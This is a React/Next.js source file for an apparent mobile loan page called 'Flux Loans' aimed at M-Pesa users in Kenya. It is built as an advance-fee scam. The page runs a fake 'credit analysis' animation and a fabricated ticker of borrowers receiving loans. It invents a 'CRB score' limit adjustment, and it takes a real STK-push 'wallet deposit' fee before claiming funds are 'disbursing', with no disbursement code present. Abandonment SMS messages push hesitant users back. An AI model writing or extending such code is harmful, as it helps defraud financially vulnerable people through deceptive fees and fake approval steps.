'use client';

import React, { useState, useEffect, useRef } from 'react';
import { 
  ShieldCheck, Lock, Smartphone, CheckCircle2, AlertCircle, Loader2, 
  UserCheck, CreditCard, ChevronRight, Zap, RefreshCw, EyeOff, 
  MessageSquare, XCircle, ArrowLeft, FileText, 
  Banknote, Info, Copy, Check, CalendarDays, Wallet, Fingerprint, Unlock, ArrowRight
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { validateEntry, generateSmartOTP } from '@/lib/loan-engine';
import { sendOTPSMS, sendAbandonmentSMS } from '@/app/actions/sms';
import Link from 'next/link';

// --- CONSTANTS ---
const MAX_LOAN_CAP = 100000; 
const SAFE_LIMIT_CAP = 15000; 
const DIRECT_PATH_LIMIT = 5000; 
const INTEREST_RATE = 0.15; 

const SOCIAL_DATA = [
  { name: "Peter Mwangi", loc: "Kiambu", amount: "15,000" },
  { name: "Sarah Otieno", loc: "Kisumu", amount: "7,500" },
  { name: "Grace Njeri", loc: "Nairobi", amount: "12,000" },
  { name: "Brian Kipkorir", loc: "Eldoret", amount: "5,000" }
];

const STANDARD_TIERS = [
  { amount: 15000, fee: 250, label: 'Gold Elite', days: 60 },
  { amount: 8500, fee: 150, label: 'Silver Boost', days: 30 },
  { amount: 3500, fee: 100, label: 'Bronze Start', days: 30 },
];

// --- COMPONENTS ---

const ProgressBar = ({ step }: { step: string }) => {
  let progress = 10;
  // Map steps to percentage
  const steps = ['entry', 'analyzing', 'otp', 'kyc_details', 'blur_reveal', 'offer_select', 'summary', 'payment', 'stk_push', 'receipt'];
  const idx = steps.indexOf(step);
  if(idx > -1) progress = ((idx + 1) / steps.length) * 100;

  return (
    <div className="fixed top-[52px] left-0 w-full h-1.5 bg-slate-200 z-40">
      <div className="h-full bg-emerald-500 transition-all duration-500 ease-out" style={{ width: `${progress}%` }}></div>
    </div>
  );
};

const NavBar = ({ canGoBack, onBack }: { canGoBack?: boolean, onBack?: () => void }) => (
  <div className="bg-slate-900 text-white p-3 flex justify-between items-center shadow-md sticky top-0 z-50 h-[52px]">
    <div className="flex items-center gap-3">
      {canGoBack ? (
        <button onClick={onBack} className="p-1 hover:bg-slate-800 rounded transition-colors"><ArrowLeft className="w-5 h-5" /></button>
      ) : (
        <div className="p-1 bg-emerald-500 rounded"><Zap className="w-4 h-4 text-white fill-current" /></div>
      )}
      <span className="font-bold tracking-tight text-sm">Flux Loans</span>
    </div>
    <div className="flex gap-4 text-[10px] font-bold uppercase tracking-wide opacity-80">
      <Link href="/quick-loans/track" className="hover:text-emerald-400">Track</Link>
      <Link href="/quick-loans/chat" className="hover:text-emerald-400">Help</Link>
    </div>
  </div>
);

const SocialTicker = () => {
  const [idx, setIdx] = useState(0);
  const [visible, setVisible] = useState(false);
  useEffect(() => {
    const timer = setInterval(() => { setVisible(true); setIdx(prev => (prev + 1) % SOCIAL_DATA.length); setTimeout(() => setVisible(false), 4000); }, 8000);
    return () => clearInterval(timer);
  }, []);
  const person = SOCIAL_DATA[idx];
  return (
    <div className={`fixed bottom-6 left-4 right-4 z-40 transition-all duration-500 transform ${visible ? 'translate-y-0 opacity-100' : 'translate-y-10 opacity-0'}`}>
      <div className="bg-slate-800/95 backdrop-blur text-white p-3 rounded-xl shadow-2xl border-l-4 border-emerald-500 flex items-center gap-3">
        <div className="bg-emerald-500/20 p-2 rounded-full"><Banknote className="w-4 h-4 text-emerald-400" /></div>
        <div className="text-xs"><p className="font-bold text-white mb-0.5">{person.name} <span className="text-slate-400 font-normal">({person.loc})</span></p><p className="text-emerald-400">Received Loan: <span className="font-bold text-white">KES {person.amount}</span></p></div>
      </div>
    </div>
  );
};

export default function ProductionLoanPage() {
  const [step, setStep] = useState('entry');
  const [isLoaded, setIsLoaded] = useState(false);
  
  // STATE
  const [formData, setFormData] = useState({ phone: '', idNumber: '', fullName: '', purpose: 'Business', reqAmount: '', duration: '30' });
  const [selectedOffer, setSelectedOffer] = useState<any>(null);
  const [isHighRequest, setIsHighRequest] = useState(false);
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState(['','','','']);
  const [prepChecked, setPrepChecked] = useState(false);
  const [receipt, setReceipt] = useState<any>(null);
  const [checkoutReqId, setCheckoutReqId] = useState('');
  
  // UI
  const [analysisStep, setAnalysisStep] = useState(0);
  const [connectStatus, setConnectStatus] = useState('');
  const [failReason, setFailReason] = useState('NETWORK');
  const [copied, setCopied] = useState(false);
  const [pollMsg, setPollMsg] = useState('Waiting for PIN...');

  // PERSISTENCE
  useEffect(() => {
    const saved = localStorage.getItem('jatelo_prod_state');
    if (saved) {
      const parsed = JSON.parse(saved);
      if (parsed.step !== 'receipt' && parsed.step !== 'failed') {
        setFormData(parsed.formData);
        setSelectedOffer(parsed.selectedOffer);
        setStep(parsed.step);
      }
    }
    setIsLoaded(true);
  }, []);

  useEffect(() => {
    if (isLoaded && step !== 'analyzing' && step !== 'connecting' && step !== 'stk_push') {
      localStorage.setItem('jatelo_prod_state', JSON.stringify({ step, formData, selectedOffer }));
    }
  }, [step, formData, selectedOffer, isLoaded]);

  // POLL TIMER REF
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // UTILS
  const calculateFee = (amount: number) => {
    if (amount <= 3500) return 100;
    if (amount <= 8500) return 150;
    return 250;
  };

  const getDates = (days: number) => {
    const d = new Date(Date.now() + 172800000); // +48h
    return {
        due1: new Date(d.getTime() + (30 * 86400000)).toLocaleDateString('en-KE'),
        due2: new Date(d.getTime() + (60 * 86400000)).toLocaleDateString('en-KE')
    };
  };

  // HANDLERS
  const handlePhone = (e: React.ChangeEvent<HTMLInputElement>) => setFormData(p => ({ ...p, phone: e.target.value.replace(/\D/g, '').slice(0, 10) }));
  const handleID = (e: React.ChangeEvent<HTMLInputElement>) => setFormData(p => ({ ...p, idNumber: e.target.value.replace(/\D/g, '').slice(0, 8) }));
  const handleAmount = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = parseInt(e.target.value.replace(/\D/g, '') || '0');
    if (val > MAX_LOAN_CAP) val = MAX_LOAN_CAP;
    setFormData(p => ({ ...p, reqAmount: val ? val.toLocaleString() : '' }));
  };

  const handleEntrySubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const val = validateEntry(formData.phone, formData.idNumber);
    if (!val.isValid) { alert("Please enter valid details."); return; }
    
    setStep('analyzing');
    let current = 0;
    const interval = setInterval(() => {
      setAnalysisStep(current); current++;
      if (current > 4) {
        clearInterval(interval);
        const code = generateSmartOTP(formData.phone);
        setOtpSent(code);
        sendOTPSMS(formData.phone, code); // TRIGGER REAL SMS
        setStep('otp');
      }
    }, 1200);
  };

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if(otpInput.join('') === otpSent) setStep('kyc_details');
    else alert("Wrong Code");
  };

  const handleKycSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.fullName || !formData.reqAmount) return;
    const requested = parseInt(formData.reqAmount.replace(/,/g, ''));
    setIsHighRequest(requested > SAFE_LIMIT_CAP);
    setStep('blur_reveal');
    
    // ABANDONMENT TRIGGER
    sendAbandonmentSMS(formData.phone, formData.fullName);
  };

  const handleReveal = () => {
    const requested = parseInt(formData.reqAmount.replace(/,/g, ''));
    if (requested <= DIRECT_PATH_LIMIT) {
      setSelectedOffer({ amount: requested, fee: calculateFee(requested), days: parseInt(formData.duration) });
      setStep('summary');
    } else {
      setStep('offer_select');
    }
  };

  // --- REAL PAYMENT LOGIC ---
  const initiateSTK = async () => {
    setStep('connecting');
    setConnectStatus('Contacting Safaricom...');
    
    try {
        // CALL REAL API
        const res = await fetch('/api/stkpush', {
            method: 'POST',
            body: JSON.stringify({ phone: formData.phone, amount: selectedOffer.fee })
        });
        const data = await res.json();
        
        if (data.success) {
            setCheckoutReqId(data.checkoutRequestID);
            setStep('stk_push');
            startPolling(data.checkoutRequestID);
        } else {
            throw new Error("STK Failed");
        }
    } catch (e) {
        setFailReason('NETWORK');
        setStep('failed');
    }
  };

  const startPolling = (reqId: string) => {
    let attempts = 0;
    pollIntervalRef.current = setInterval(async () => {
        attempts++;
        if(attempts > 60) { // 2 mins timeout
            clearInterval(pollIntervalRef.current!);
            setFailReason('NETWORK');
            setStep('failed');
            return;
        }
        
        // CHECK STATUS
        const res = await fetch(`/api/check-status?id=${reqId}`);
        const data = await res.json();
        
        if (data.status === 'COMPLETED') {
            clearInterval(pollIntervalRef.current!);
            localStorage.removeItem('jatelo_prod_state');
            setReceipt({
                code: data.receipt,
                trackId: data.trackId,
                date: new Date().toLocaleDateString(),
                time: new Date().toLocaleTimeString()
            });
            setStep('receipt');
        } else if (data.status === 'FAILED') {
            clearInterval(pollIntervalRef.current!);
            setFailReason('CANCEL');
            setStep('failed');
        }
    }, 2000);
  };

  // CLEANUP
  useEffect(() => () => { if(pollIntervalRef.current) clearInterval(pollIntervalRef.current); }, []);

  if (!isLoaded) return <div className="min-h-screen bg-slate-50 flex items-center justify-center"><Loader2 className="animate-spin text-slate-400" /></div>;

  return (
    <div className="min-h-screen bg-slate-50 font-sans text-slate-900 pb-20 pt-[60px]">
      <NavBar canGoBack={step !== 'entry'} onBack={() => setStep('entry')} />
      <ProgressBar step={step} />
      <SocialTicker />

      {/* 1. ENTRY */}
      {step === 'entry' && (
        <div className="max-w-md mx-auto p-4 pt-8 animate-in slide-in-from-bottom-4">
           <div className="bg-white p-6 rounded-2xl shadow-xl border border-slate-200">
              <div className="text-center mb-6"><h1 className="text-2xl font-black text-slate-900 mb-2">Get Instant Cash</h1><p className="text-sm text-slate-500">Loans up to KES 100,000 sent to M-Pesa.</p></div>
              <form onSubmit={handleEntrySubmit} className="space-y-4">
                 <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">National ID</label><input type="tel" className="w-full h-14 pl-4 border border-slate-300 rounded-xl font-mono text-lg font-bold outline-none focus:border-blue-600" placeholder="12345678" value={formData.idNumber} onChange={handleID} /></div>
                 <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Safaricom Number</label><input type="tel" className="w-full h-14 pl-4 border border-slate-300 rounded-xl font-mono text-lg font-bold outline-none focus:border-blue-600" placeholder="07XX XXX XXX" value={formData.phone} onChange={handlePhone} /></div>
                 <Button className="w-full h-14 bg-blue-900 hover:bg-blue-800 text-white font-bold text-lg rounded-xl shadow-lg">Verify Eligibility <ArrowRight className="ml-2 w-5 h-5" /></Button>
              </form>
           </div>
        </div>
      )}

      {/* 2. ANALYZING */}
      {step === 'analyzing' && (
         <div className="fixed inset-0 bg-white z-[60] flex flex-col items-center justify-center p-8">
            <div className="w-full max-w-xs space-y-6">
               <div className="flex justify-center mb-8"><div className="relative w-24 h-24"><svg className="w-full h-full" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="none" stroke="#e2e8f0" strokeWidth="8" /><circle cx="50" cy="50" r="45" fill="none" stroke="#059669" strokeWidth="8" strokeDasharray="283" strokeDashoffset={283 - (283 * (analysisStep + 1) / 4)} className="transition-all duration-1000 ease-linear" transform="rotate(-90 50 50)" /></svg></div></div>
               <div className="bg-slate-50 p-6 rounded-2xl border border-slate-100 space-y-4">
                  {["Checking ID Database", "Verifying M-Pesa Status", "Analyzing Credit Score", "Preparing Offer"].map((label, i) => (
                     <div key={i} className="flex items-center gap-3"><div className={`w-5 h-5 rounded-full flex items-center justify-center border-2 ${i < analysisStep ? 'bg-emerald-500 border-emerald-500 text-white' : i === analysisStep ? 'border-emerald-500 text-emerald-500 animate-pulse' : 'border-slate-300 text-transparent'}`}>{i < analysisStep && <CheckCircle2 className="w-3 h-3" />}</div><span className={`text-sm font-medium ${i <= analysisStep ? 'text-slate-900' : 'text-slate-400'}`}>{label}</span></div>
                  ))}
               </div>
            </div>
         </div>
      )}

      {/* 3. OTP */}
      {step === 'otp' && (
         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
             <div className="bg-white p-6 rounded-2xl shadow-xl border-t-4 border-blue-900">
                <h2 className="text-xl font-black text-slate-900 mb-2">Verify Phone</h2>
                <p className="text-sm text-slate-500 mb-6">Enter code sent to {formData.phone}</p>
                <form onSubmit={handleOtpSubmit}><div className="flex gap-3 justify-center mb-8">{otpInput.map((val, i) => (<input key={i} id={`otp-${i}`} type="tel" maxLength={1} value={val} onChange={(e) => { const n = [...otpInput]; n[i] = e.target.value; setOtpInput(n); if(e.target.value && i < 3) document.getElementById(`otp-${i+1}`)?.focus(); }} className="w-14 h-14 border-2 border-slate-200 rounded-xl text-center text-2xl font-black text-slate-900 focus:border-blue-900 outline-none" />))}</div><Button className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl">Confirm</Button></form>
             </div>
         </div>
      )}

      {/* 4. KYC */}
      {step === 'kyc_details' && (
         <div className="max-w-md mx-auto p-4 pt-8 animate-in slide-in-from-right">
             <div className="bg-white p-6 rounded-2xl shadow-xl border border-slate-200">
                <h2 className="text-lg font-black text-slate-900 mb-4">Application Details</h2>
                <form onSubmit={handleKycSubmit} className="space-y-4">
                   <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Full Name</label><input type="text" className="w-full h-12 px-4 border border-slate-300 rounded-xl font-bold uppercase outline-none focus:border-blue-600" value={formData.fullName} onChange={e => setFormData({...formData, fullName: e.target.value})} required /></div>
                   <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Loan Purpose</label><select className="w-full h-12 px-4 border border-slate-300 rounded-xl font-bold bg-white outline-none" value={formData.purpose} onChange={e => setFormData({...formData, purpose: e.target.value})}><option>Business Stock</option><option>School Fees</option><option>Emergency</option></select></div>
                   <div className="grid grid-cols-2 gap-3">
                      <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Amount</label><input type="text" className="w-full h-12 px-4 border border-slate-300 rounded-xl font-bold font-mono outline-none focus:border-blue-600" value={formData.reqAmount} onChange={handleAmount} required /></div>
                      <div><label className="text-xs font-bold text-slate-700 uppercase mb-1 block">Duration</label><select className="w-full h-12 px-2 border border-slate-300 rounded-xl font-bold bg-white outline-none" value={formData.duration} onChange={e => setFormData({...formData, duration: e.target.value})}><option value="30">30 Days</option><option value="60">60 Days</option></select></div>
                   </div>
                   <Button className="w-full h-14 bg-emerald-600 text-white font-bold text-lg rounded-xl mt-2">Check Approval</Button>
                </form>
             </div>
         </div>
      )}

      {/* 5. BLUR REVEAL */}
      {step === 'blur_reveal' && (
         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
             <div className="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-slate-800 relative">
                <div className="p-8 text-center text-white">
                   <div className="w-20 h-20 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6 relative group cursor-pointer" onClick={handleReveal}><div className="absolute inset-0 rounded-full border-2 border-emerald-500/30 animate-ping"></div><Fingerprint className="w-10 h-10 text-emerald-400" /></div>
                   <h2 className="text-xl font-bold mb-2">Offer Secured</h2>
                   <p className="text-sm text-slate-400 mb-8">Tap fingerprint to decrypt offer.</p>
                   <Button onClick={handleReveal} className="w-full h-14 bg-emerald-600 text-white font-bold text-lg rounded-xl"><Unlock className="w-5 h-5 mr-2" /> Decrypt & Reveal</Button>
                </div>
             </div>
         </div>
      )}

      {/* 6. OFFER SELECT (>5k) */}
      {step === 'offer_select' && (
         <div className="max-w-md mx-auto p-4 pt-6 animate-in slide-in-from-right">
            {isHighRequest && <div className="bg-orange-50 border border-orange-200 p-3 rounded-xl mb-4 flex gap-3 items-start"><AlertCircle className="w-5 h-5 text-orange-600 shrink-0" /><div><h3 className="text-sm font-bold text-orange-800">Limit Adjusted</h3><p className="text-xs text-orange-700">Request adjusted based on CRB score.</p></div></div>}
            <h2 className="text-xl font-black text-slate-900 mb-4 px-2">Select Option</h2>
            <div className="space-y-4">{STANDARD_TIERS.map((tier) => (<div key={tier.amount} onClick={() => { setSelectedOffer(tier); setStep('summary'); }} className="bg-white p-5 rounded-2xl border-2 border-slate-100 hover:border-emerald-500 cursor-pointer shadow-sm relative group overflow-hidden transition-all hover:scale-[1.02]"><div className="flex justify-between items-center mb-2"><span className="text-xs font-bold text-slate-500 uppercase tracking-wider">{tier.label}</span><span className="text-[10px] font-bold bg-blue-50 text-blue-700 px-2 py-1 rounded">{tier.days} Days</span></div><div className="flex justify-between items-end"><span className="text-3xl font-black text-slate-900">KES {tier.amount.toLocaleString()}</span><ChevronRight className="w-6 h-6 text-slate-300 group-hover:text-emerald-500" /></div></div>))}</div>
         </div>
      )}

      {/* 7. SUMMARY */}
      {step === 'summary' && selectedOffer && (
         <div className="max-w-md mx-auto p-4 pt-6 animate-in slide-in-from-right">
             <div className="bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden">
                <div className="bg-slate-900 text-white p-4 flex justify-between items-center"><span className="font-bold">Contract Summary</span><FileText className="w-5 h-5 text-emerald-400" /></div>
                <div className="p-6 space-y-4">
                   <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 space-y-2">
                      <div className="flex justify-between"><span className="text-xs font-bold text-slate-400">Applicant</span><span className="text-sm font-black text-slate-900 uppercase">{formData.fullName}</span></div>
                      <div className="flex justify-between"><span className="text-xs font-bold text-slate-400">Phone</span><span className="text-xs font-mono font-bold text-slate-600">{formData.phone}</span></div>
                   </div>
                   <div className="space-y-3 pb-4 border-b border-dashed border-slate-200">
                      <div className="flex justify-between text-sm"><span className="text-slate-600">Principal</span><span className="font-bold text-slate-900">KES {selectedOffer.amount.toLocaleString()}</span></div>
                      <div className="flex justify-between text-sm"><span className="text-slate-600">Interest (15%)</span><span className="font-bold text-slate-900">KES {(selectedOffer.amount * INTEREST_RATE).toLocaleString()}</span></div>
                      <div className="flex justify-between text-sm border-t pt-2"><span className="font-black text-slate-900">Total Repayment</span><span className="font-black text-blue-900">KES {(selectedOffer.amount * 1.15).toLocaleString()}</span></div>
                   </div>
                   {/* Wallet Credit Logic */}
                   <div className="bg-emerald-50 rounded-xl p-4 border border-emerald-100"><div className="flex justify-between items-center mb-2 pb-2 border-b border-emerald-200/50"><span className="text-xs font-bold text-emerald-800 uppercase">Wallet Deposit</span><span className="text-lg font-black text-red-500">- KES {selectedOffer.fee}</span></div><div className="flex justify-between items-end"><div><p className="text-[10px] font-bold text-emerald-700 uppercase">Net Disbursement</p><p className="text-[9px] text-emerald-600">Instant Transfer</p></div><span className="text-2xl font-black text-emerald-700">KES {(selectedOffer.amount - selectedOffer.fee).toLocaleString()}</span></div></div>
                   <div className="flex gap-3 items-start p-3 bg-yellow-50 rounded-lg border border-yellow-100"><Wallet className="w-4 h-4 text-yellow-600 shrink-0 mt-0.5" /><p className="text-[10px] text-yellow-800">Deposit of <strong>KES {selectedOffer.fee}</strong> is required. This is <strong>credited to your loan wallet</strong> as an early repayment.</p></div>
                   <label className="flex gap-3 items-center cursor-pointer group p-2 hover:bg-slate-50 rounded-lg"><input type="checkbox" checked={prepChecked} onChange={e => setPrepChecked(e.target.checked)} className="w-5 h-5 rounded border-slate-300" /><span className="text-xs text-slate-600 font-bold">I agree to Terms & Conditions.</span></label>
                   <Button onClick={initiateSTK} disabled={!prepChecked} className="w-full h-14 bg-blue-900 hover:bg-blue-800 text-white font-bold text-lg rounded-xl shadow-lg disabled:opacity-50">Activate Loan Limit</Button>
                </div>
             </div>
         </div>
      )}

      {/* 8. CONNECTING / STK PUSH */}
      {(step === 'connecting' || step === 'stk_push') && (
         <div className="fixed inset-0 bg-slate-900/95 z-[70] flex flex-col items-center justify-center p-6 text-center">
             <div className="w-24 h-24 bg-emerald-500/20 rounded-full flex items-center justify-center mb-6 relative">
                <div className="absolute inset-0 border-4 border-emerald-500/50 rounded-full animate-ping"></div>
                {step === 'connecting' ? <Zap className="w-10 h-10 text-emerald-400" /> : <Smartphone className="w-10 h-10 text-emerald-400 animate-pulse" />}
             </div>
             <h2 className="text-2xl font-black text-white mb-2">{step === 'connecting' ? 'Secure Link...' : 'Check Your Phone'}</h2>
             <p className="text-emerald-400 font-bold mb-8 animate-pulse text-sm">{step === 'connecting' ? connectStatus : `Enter PIN to Deposit KES ${selectedOffer.fee}`}</p>
         </div>
      )}

      {/* 9. RECEIPT */}
      {step === 'receipt' && receipt && (
         <div className="max-w-md mx-auto p-4 pt-10 animate-in zoom-in-95">
             <div className="bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200 relative">
                <div className="absolute top-0 left-0 w-full h-2 bg-emerald-500"></div>
                <div className="p-8 text-center">
                   <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-4 relative"><CheckCircle2 className="w-8 h-8 text-emerald-600 relative z-10" /></div>
                   <h2 className="text-xl font-black text-slate-900 mb-1">Limit Active</h2>
                   <p className="text-xs text-slate-500 font-medium mb-6">Deposit Verified. Funds Disbursing.</p>
                   <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 font-mono text-xs text-left space-y-3 mb-4 relative">
                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-500">M-Pesa Ref:</span><span className="font-bold text-slate-900">{receipt.code}</span></div>
                      <div className="flex justify-between border-b border-slate-200 pb-2"><span className="text-slate-500">Tracking ID:</span><span className="font-bold text-blue-600">{receipt.trackId}</span></div>
                      <div className="flex justify-between"><span className="text-slate-500">Status:</span><span className="font-bold text-emerald-600">Processing</span></div>
                   </div>
                   <p className="text-[10px] text-slate-400 mb-6">* Save your Tracking ID.</p>
                   <div className="space-y-3"><Link href="/quick-loans-test/track"><Button className="w-full h-12 bg-slate-900 text-white font-bold rounded-xl shadow-lg">Track Disbursement</Button></Link><Link href="/quick-loans-test/chat"><Button variant="outline" className="w-full h-12 border-slate-200 font-bold rounded-xl hover:bg-slate-50 text-slate-600"><MessageSquare className="w-4 h-4 mr-2" /> Contact Support</Button></Link></div>
                </div>
             </div>
         </div>
      )}

      {/* 10. FAILED */}
      {step === 'failed' && (
         <div className="max-w-md mx-auto p-4 pt-20 text-center animate-in zoom-in-95">
             <div className="w-20 h-20 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-6"><RefreshCw className="w-10 h-10 text-orange-500" /></div>
             <h2 className="text-xl font-black text-slate-900 mb-2">{failReason === 'CANCEL' ? 'Request Cancelled' : 'Connection Failed'}</h2>
             <p className="text-sm text-slate-500 mb-8 px-6">We could not secure the connection. Please retry the activation request.</p>
             <Button onClick={initiateSTK} className="w-full h-14 bg-blue-900 text-white font-bold rounded-xl shadow-lg">Retry Activation</Button>
         </div>
      )}
    </div>
  );
}